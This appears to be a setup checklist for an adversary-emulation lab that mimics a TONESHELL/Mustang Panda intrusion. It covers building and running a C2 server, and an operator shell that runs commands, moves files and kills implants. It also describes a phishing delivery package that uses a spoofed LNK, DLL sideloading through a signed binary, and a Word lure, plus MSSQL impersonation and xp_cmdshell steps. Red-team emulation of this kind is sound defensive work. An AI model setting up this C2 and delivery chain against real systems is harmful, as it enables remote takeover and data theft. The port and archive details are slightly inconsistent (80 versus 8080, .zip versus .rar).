# Setup — q3-plan Lab Preparation

Pre-run checklist before executing any Phase. Steps here are operator-side — not emulated adversary behavior.

---

## Attacker Infrastructure

### TONESHELL controlServer

#### Build (one-time, on attacker host)

```bash
cd testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer
go mod download
go build -o controlServer -ldflags '-s -w' main.go
```

Requires Go ≥ 1.18 and CGO enabled (for `go-sqlite3`):

```bash
# Debian/Ubuntu — install build dependencies if not present
sudo apt-get install -y golang gcc libsqlite3-dev
```

#### Run

Start on the attacker host (`192.168.56.2`) before running Phase 1. Handler and REST API run in the same process — one terminal:

```bash
# On attacker host (192.168.56.2)
cd testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer
./controlServer -c config/lab_toneshell.yml
```

Sessions are held in-memory by default (no SQLite). To persist across restarts:

```bash
./controlServer -c config/lab_toneshell.yml -db          # create new DB
./controlServer -c config/lab_toneshell.yml -existing-db # resume existing DB
```

The REST API listens on `127.0.0.1:9999` (configured in `config/lab_restapi.yml`, loaded automatically). Use `toneshell_shell.py` to interact with sessions:

```bash
# Install dependency (one-time)
pip3 install -r requirements.txt

# Launch interactive shell
python3 toneshell_shell.py
```

Key commands inside the shell:

| Command | Effect |
|---|---|
| `sessions` | List active C2 sessions |
| `use <session_id>` | Attach to a session |
| `<any command>` | Execute shell command on implant (EXEC task) |
| `get <remote_path>` | Pull file from implant to server |
| `put <payload_name> <dest_path>` | Push file from server payloads dir to implant |
| `kill` | Send TERMINATE (implant self-destructs) |
| `detach` | Unattach, return to session-picker |
| `exit` | Quit the shell |

Use a non-default REST API port: `python3 toneshell_shell.py --port 9999`

Verify handler is listening on TCP 8443:

```bash
ss -tlnp | grep 8443
# Expected: LISTEN 0 ... 0.0.0.0:8443
```

> **Magic bytes:** The TONESHELL binary is compiled with `TONESHELL_MAGIC_0=0xC7 TONESHELL_MAGIC_1=0x3A TONESHELL_MAGIC_2=0x1F` (see `toneshell-v2/CMakePresets.json`). The handler reads `magic_bytes: "c73a1f"` from `lab_toneshell.yml` and validates all inbound packets against these bytes. If the binary is rebuilt with different magic values, update `lab_toneshell.yml` to match before starting the server.

### Adversary Staging Web Server

The `simplefileserver` handler in controlServer serves the delivery package — no separate process needed. It starts automatically with controlServer and serves files from `../toneshell-v2/` at prefix `/files` on TCP 80.

Verify it is reachable from WS01:

```powershell
# From WS01
Invoke-WebRequest -Uri "http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip" -Method Head
# Expected: StatusCode 200
```

### Delivery Package

Confirm the following files are prepared and in place:

**On attacker host** — served via staging web server (port 8080):
- `250325_Pentos_Board_Minutes.zip` — password-protected ZIP (`Pentos`) containing:
  - `Essos Competitiveness Brief.lnk` — icon spoofed to `shell32.dll,70`
  - `EssosUpdate.exe` — renamed `wsddebug_host.exe` (signed Microsoft binary)
  - `wsdapi.dll` — attacker-controlled sideload DLL (Tully Enterprises self-signed cert)

**On WS01** — staged by operator via RDP before running Phase 1:
- `C:\Users\labuser\Desktop\Braavos_Competitiveness_Brief.docx` — Word lure document with embedded hyperlink pointing to `http://192.168.56.2:8080/250325_Pentos_Board_Minutes.rar`

If the package needs to be rebuilt, see:
[`../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/README.md`](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/README.md)

---

## Network Connectivity

| Source | Destination | Port | Protocol | Required for |
| - | - | - | - | - |
| WS01 (10.12.10.30) | Attacker (192.168.56.2) | 80 | TCP | Delivery package download via simplefileserver (Phase 1) |
| WS01 (10.12.10.30) | Attacker (192.168.56.2) | 8443 | TCP | TONESHELL C2 beacon (Phase 1+) |
| WS01 (10.12.10.30) | IIS01 (10.12.10.20) | 1433 | TCP | MSSQL credential use (Phase 2) |

Verify WS01 → attacker path:

```powershell
# From WS01
Test-NetConnection -ComputerName 192.168.56.2 -Port 8443
# Expected: TcpTestSucceeded: True
```

---

## Host Baselines

### WS01

- Logged-in user: `TESTLAB\labuser` (RDP or console)
- `Braavos_Competitiveness_Brief.docx` staged to `C:\Users\labuser\Desktop\` by operator via RDP before running Phase 1
- Credential artifact seeded: `C:\Users\labuser\Documents\DevPortal\appsettings.json` (see [Windows Server 2022-MSSQL.md](../resources/setup/Windows%20Server%202022-MSSQL.md) Step 6)
- Optional: SSMS 20 installed with `svc_app_dev` saved connection in Credential Manager

### IIS01

- MSSQL impersonation chain configured: see [Windows Server 2022-MSSQL.md](../resources/setup/Windows%20Server%202022-MSSQL.md)
- `DevPortalDB` database exists with `svc_app_dev` login and `IMPERSONATE ON LOGIN::sa` grant
- `xp_cmdshell` **disabled** (SQL Server default — enabling it is the attack step)
- VM snapshot taken after Step 8 of the MSSQL setup doc

#### TermService disabled (required for Phase 3 — PhantomRPC)

Phase 3 uses PhantomRPC TERM variant — requires TermService stopped on IIS01. See [Windows Server 2022-MSSQL.md](../resources/setup/Windows%20Server%202022-MSSQL.md) Step 9 for setup and WinRM alternative access.

---

## Cleanup Reminder

Run [Cleanup.md](Cleanup.md) after each test run before re-running phases. The TONESHELL C2 session, injected shellcode in `waitfor.exe`, and `wsdapih.log` / `Web.CompressShaders.config` artifacts all persist across reboots if not cleaned.
